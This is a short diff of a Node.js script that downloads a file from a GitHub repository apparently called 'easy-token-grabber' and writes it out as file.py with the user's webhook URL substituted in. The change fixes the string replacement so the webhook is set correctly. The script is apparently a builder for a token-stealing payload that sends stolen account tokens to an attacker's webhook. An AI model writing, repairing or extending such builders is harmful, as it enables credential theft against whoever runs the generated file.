@@ -29,7 +29,7 @@ superagent.get("https://raw.githubusercontent.com/Hugi1410/easy-token-grabber/ma
         if (err) {
             return console.log(err);
         }
-        var result = data.replace(/WEBHOOK_URL = 'dev by daskill'/g, 'WEBHOOK_URL' + '"' + webhook + '"');
+        var result = data.replace(/WEBHOOK_URL = 'dev by daskill'/g, 'WEBHOOK_URL =' + '"' + webhook + '"');
 
         fs.writeFile("file.py", result, 'utf8', function(err) {
             if (err) return console.log(err);
